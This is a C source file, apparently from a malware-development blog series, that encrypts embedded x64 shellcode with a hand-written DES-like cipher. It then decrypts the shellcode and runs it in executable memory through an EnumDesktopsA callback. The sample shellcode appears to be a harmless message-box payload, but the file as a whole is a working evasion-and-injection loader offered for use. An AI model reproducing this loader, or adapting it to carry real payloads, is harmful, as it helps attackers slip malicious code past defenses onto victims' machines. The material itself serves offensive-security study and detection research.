/*
* hack.c
* encrypt/decrypt payload via
* DES-like cipher
* author: @cocomelonc
* https://cocomelonc.github.io/malware/2025/01/16/malware-cryptography-39.html
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <windows.h>

#define BLOCK_SIZE 8

// initial permutation table
static const uint8_t IP_TABLE[] = {
  58, 50, 42, 34, 26, 18, 10, 2,
  60, 52, 44, 36, 28, 20, 12, 4,
  62, 54, 46, 38, 30, 22, 14, 6,
  64, 56, 48, 40, 32, 24, 16, 8,
  57, 49, 41, 33, 25, 17,  9, 1,
  59, 51, 43, 35, 27, 19, 11, 3,
  61, 53, 45, 37, 29, 21, 13, 5,
  63, 55, 47, 39, 31, 23, 15, 7
};

// final permutation table
static const uint8_t FP_TABLE[] = {
  40, 8, 48, 16, 56, 24, 64, 32,
  39, 7, 47, 15, 55, 23, 63, 31,
  38, 6, 46, 14, 54, 22, 62, 30,
  37, 5, 45, 13, 53, 21, 61, 29,
  36, 4, 44, 12, 52, 20, 60, 28,
  35, 3, 43, 11, 51, 19, 59, 27,
  34, 2, 42, 10, 50, 18, 58, 26,
  33, 1, 41,  9, 49, 17, 57, 25
};

// expansion table
static const uint8_t E_TABLE[] = {
  32, 1, 2, 3, 4, 5,
  4, 5, 6, 7, 8, 9,
  8, 9, 10, 11, 12, 13,
  12, 13, 14, 15, 16, 17,
  16, 17, 18, 19, 20, 21,
  20, 21, 22, 23, 24, 25,
  24, 25, 26, 27, 28, 29,
  28, 29, 30, 31, 32, 1
};

// permutation table
static const uint8_t P_TABLE[] = {
  16, 7, 20, 21,
  29, 12, 28, 17,
  1, 15, 23, 26,
  5, 18, 31, 10,
  2, 8, 24, 14,
  32, 27, 3, 9,
  19, 13, 30, 6,
  22, 11, 4, 25
};

// S-Boxes
static const uint8_t S_BOXES[8][4][16] = {
  {
    {14,  4, 13,  1,  2, 15, 11,  8,  3, 10,  6, 12,  5,  9,  0,  7},
    { 0, 15,  7,  4, 14,  2, 13,  1, 10,  6, 12, 11,  9,  5,  3,  8},
    { 4,  1, 14,  8, 13,  6,  2, 11, 15, 12,  9,  7,  3, 10,  5,  0},
    {15, 12,  8,  2,  4,  9,  1,  7,  5, 11,  3, 14, 10,  0,  6, 13}
  },
  {
    {15,  1,  8, 14,  6, 11,  3,  4,  9,  7,  2, 13, 12,  0,  5, 10},
    { 3, 13,  4,  7, 15,  2,  8, 14, 12,  0,  1, 10,  6,  9, 11,  5},
    { 0, 14,  7, 11, 10,  4, 13,  1,  5,  8, 12,  6,  9,  3,  2, 15},
    {13,  8, 10,  1,  3, 15,  4,  2, 11,  6,  7, 12,  0,  5, 14,  9}
  },
  {
    {10,  0,  9, 14,  6,  3, 15,  5,  1, 13, 12,  7, 11,  4,  2,  8},
    {13,  7,  0,  9,  3,  4,  6, 10,  2,  8,  5, 14, 12, 11, 15,  1},
    {13,  6,  4,  9,  8, 15,  3,  0, 11,  1,  2, 12,  5, 10, 14,  7},
    { 1, 10, 13,  0,  6,  9,  8,  7,  4, 15, 14,  3, 11,  5,  2, 12}
  },
  {
    { 7, 13, 14,  3,  0,  6,  9, 10,  1,  2,  8,  5, 11, 12,  4, 15},
    {13,  8, 11,  5,  6, 15,  0,  3,  4,  7,  2, 12,  1, 10, 14,  9},
    {10,  6,  9,  0, 12, 11,  7, 13, 15,  1,  3, 14,  5,  2,  8,  4},
    { 3, 15,  0,  6, 10,  1, 13,  8,  9,  4,  5, 11, 12,  7,  2, 14}
  },
  {
    { 2, 12,  4,  1,  7, 10, 11,  6,  8,  5,  3, 15, 13,  0, 14,  9},
    {14, 11,  2, 12,  4,  7, 13,  1,  5,  0, 15, 10,  3,  9,  8,  6},
    { 4,  2,  1, 11, 10, 13,  7,  8, 15,  9, 12,  5,  6,  3,  0, 14},
    {11,  8, 12,  7,  1, 14,  2, 13,  6, 15,  0,  9, 10,  4,  5,  3}
  },
  {
    {12,  1, 10, 15,  9,  2,  6,  8,  0, 13,  3,  4, 14,  7,  5, 11},
    {10, 15,  4,  2,  7, 12,  9,  5,  6,  1, 13, 14,  0, 11,  3,  8},
    { 9, 14, 15,  5,  2,  8, 12,  3,  7,  0,  4, 10,  1, 13, 11,  6},
    { 4,  3,  2, 12,  9,  5, 15, 10, 11, 14,  1,  7,  6,  0,  8, 13}
  },
  {
    { 4, 11,  2, 14, 15,  0,  8, 13,  3, 12,  9,  7,  5, 10,  6,  1},
    {13,  0, 11,  7,  4,  9,  1, 10, 14,  3,  5, 12,  2, 15,  8,  6},
    { 1,  4, 11, 13, 12,  3,  7, 14, 10, 15,  6,  8,  0,  5,  9,  2},
    { 6, 11, 13,  8,  1,  4, 10,  7,  9,  5,  0, 15, 14,  2,  3, 12}
  },
  {
    {13,  2,  8,  4,  6, 15, 11,  1, 10,  9,  3, 14,  5,  0, 12,  7},
    { 1, 15, 13,  8, 10,  3,  7,  4, 12,  5,  6, 11,  0, 14,  9,  2},
    { 7, 11,  4,  1,  9, 12, 14,  2,  0,  6, 10, 13, 15,  3,  5,  8},
    { 2,  1, 14,  7,  4, 10,  8, 13, 15, 12,  9,  0,  3,  5,  6, 11}
  }
};

// PC-1 table (key permutation)
static const uint8_t PC1_TABLE[] = {
  57, 49, 41, 33, 25, 17, 9,
  1, 58, 50, 42, 34, 26, 18,
  10, 2, 59, 51, 43, 35, 27,
  19, 11, 3, 60, 52, 44, 36,
  63, 55, 47, 39, 31, 23, 15,
  7, 62, 54, 46, 38, 30, 22,
  14, 6, 61, 53, 45, 37, 29,
  21, 13, 5, 28, 20, 12, 4
};

// PC-2 table (key permutation for each round)
static const uint8_t PC2_TABLE[] = {
  14, 17, 11, 24, 1, 5,
  3, 28, 15, 6, 21, 10,
  23, 19, 12, 4, 26, 8,
  16, 7, 27, 20, 13, 2,
  41, 52, 31, 37, 47, 55,
  30, 40, 51, 45, 33, 48,
  44, 49, 39, 56, 34, 53,
  46, 42, 50, 36, 29, 32
};

// key shifts per round
static const uint8_t SHIFT_TABLE[] = {
  1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1
};

// function for bit permutation
uint64_t permute(uint64_t input, const uint8_t *table, int table_size) {
  uint64_t output = 0;
  for (int i = 0; i < table_size; i++) {
    if ((input >> (64 - table[i])) & 1) {
      output |= (1ULL << (table_size - 1 - i));
    }
  }
  return output;
}

// function for left shift
uint64_t left_shift(uint64_t input, int shift, int size) {
  return ((input << shift) | (input >> (size - shift))) & ((1ULL << size) - 1);
}

// function to generate round keys
void generate_round_keys(uint64_t key, uint64_t *round_keys) {
  uint64_t permuted_key = permute(key, PC1_TABLE, sizeof(PC1_TABLE));
  uint64_t C = (permuted_key >> 28) & ((1ULL << 28) - 1);
  uint64_t D = permuted_key & ((1ULL << 28) - 1);

  for (int round = 0; round < 16; round++) {
    C = left_shift(C, SHIFT_TABLE[round], 28);
    D = left_shift(D, SHIFT_TABLE[round], 28);
    uint64_t combined_key = (C << 28) | D;
    round_keys[round] = permute(combined_key, PC2_TABLE, sizeof(PC2_TABLE));
  }
}


// function for the Feistel function
uint64_t feistel(uint64_t R, uint64_t round_key) {
  uint64_t expanded_R = permute(R, E_TABLE, sizeof(E_TABLE));
  uint64_t xor_result = expanded_R ^ round_key;
  uint64_t s_box_result = 0;

  for (int i = 0; i < 8; i++) {
    uint8_t row = ((xor_result >> (42 - (i * 6))) & 0x2) | ((xor_result >> (47 - (i * 6))) & 0x1);
    uint8_t col = (xor_result >> (43 - (i * 6))) & 0xF;
    uint8_t s_box_value = S_BOXES[i][row][col];
    s_box_result |= (uint64_t)s_box_value << (28 - (i * 4));
  }
  return permute(s_box_result, P_TABLE, sizeof(P_TABLE));
}


// function for DES encryption
void des_encrypt_block(uint8_t *block, uint64_t *round_keys) {
  uint64_t input = 0;
  for (int i = 0; i < 8; i++) {
    input = (input << 8) | block[i];
  }
  uint64_t permuted_input = permute(input, IP_TABLE, sizeof(IP_TABLE));
  uint64_t L = (permuted_input >> 32) & 0xFFFFFFFF;
  uint64_t R = permuted_input & 0xFFFFFFFF;

  for (int i = 0; i < 16; i++) {
    uint64_t next_L = R;
    uint64_t next_R = L ^ feistel(R, round_keys[i]);
    L = next_L;
    R = next_R;
  }

  uint64_t combined = (R << 32) | L;
  uint64_t output = permute(combined, FP_TABLE, sizeof(FP_TABLE));

  for (int i = 7; i >= 0; i--) {
    block[i] = (output >> (i * 8)) & 0xFF;
  }
}

// function for DES decryption
void des_decrypt_block(uint8_t *block, uint64_t *round_keys) {
  uint64_t input = 0;
  for (int i = 0; i < 8; i++) {
    input = (input << 8) | block[i];
  }
  uint64_t permuted_input = permute(input, IP_TABLE, sizeof(IP_TABLE));
  uint64_t L = (permuted_input >> 32) & 0xFFFFFFFF;
  uint64_t R = permuted_input & 0xFFFFFFFF;

  for (int i = 15; i >= 0; i--) {
    uint64_t next_R = L;
    uint64_t next_L = R ^ feistel(L, round_keys[i]);
    L = next_L;
    R = next_R;
  }
  uint64_t combined = (R << 32) | L;
  uint64_t output = permute(combined, FP_TABLE, sizeof(FP_TABLE));

  for (int i = 7; i >= 0; i--) {
    block[i] = (output >> (i * 8)) & 0xFF;
  }
}

// function to encrypt the payload
void des_encrypt_payload(unsigned char *payload, int payload_len, uint64_t key) {
  uint64_t round_keys[16];
  generate_round_keys(key, round_keys);

  int i;
  for (i = 0; i < payload_len / BLOCK_SIZE; i++) {
    des_encrypt_block(payload + i * BLOCK_SIZE, round_keys);
  }
  int remaining = payload_len % BLOCK_SIZE;
  if (remaining != 0) {
    unsigned char pad[BLOCK_SIZE] = {0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
    memcpy(pad, payload + (payload_len / BLOCK_SIZE) * BLOCK_SIZE, remaining);
    des_encrypt_block(pad, round_keys);
    memcpy(payload + (payload_len / BLOCK_SIZE) * BLOCK_SIZE, pad, remaining);
  }
}

// function to decrypt the payload
void des_decrypt_payload(unsigned char *payload, int payload_len, uint64_t key) {
  uint64_t round_keys[16];
  generate_round_keys(key, round_keys);

  int i;
  for (i = 0; i < payload_len / BLOCK_SIZE; i++) {
    des_decrypt_block(payload + i * BLOCK_SIZE, round_keys);
  }
  int remaining = payload_len % BLOCK_SIZE;
  if (remaining != 0) {
    unsigned char pad[BLOCK_SIZE] = {0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
    memcpy(pad, payload + (payload_len / BLOCK_SIZE) * BLOCK_SIZE, remaining);
    des_decrypt_block(pad, round_keys);
    memcpy(payload + (payload_len / BLOCK_SIZE) * BLOCK_SIZE, pad, remaining);
  }
}


// example usage
int main() {
  unsigned char my_payload[] = 
  "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
  "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
  "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
  "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
  "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
  "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
  "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
  "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
  "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
  "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
  "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
  "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
  "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
  "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
  "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
  "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
  "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
  "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
  "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
  "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
  "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
  "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
  "\x2e\x2e\x5e\x3d\x00";
  int my_payload_len = sizeof(my_payload) - 1;

  uint64_t key = 0x0123456789ABCDEF;

  int pad_len = my_payload_len + (BLOCK_SIZE - my_payload_len % BLOCK_SIZE) % BLOCK_SIZE;
  unsigned char padded[pad_len];
  memset(padded, 0x90, pad_len);
  memcpy(padded, my_payload, my_payload_len);


  printf("original payload: ");
  for (int i = 0; i < my_payload_len; i++) {
    printf("%02x ", my_payload[i]);
  }
  printf("\n\n");

  des_encrypt_payload(padded, pad_len, key);

  printf("encrypted payload: ");
   for (int i = 0; i < pad_len; i++) {
    printf("%02x ", padded[i]);
  }
  printf("\n\n");

  des_decrypt_payload(padded, pad_len, key);

  printf("decrypted payload: ");
  for (int i = 0; i < my_payload_len; i++) {
    printf("%02x ", padded[i]);
  }
  printf("\n\n");
  
  LPVOID mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  RtlMoveMemory(mem, padded, my_payload_len);
  EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, (LPARAM)NULL);

  return 0;
}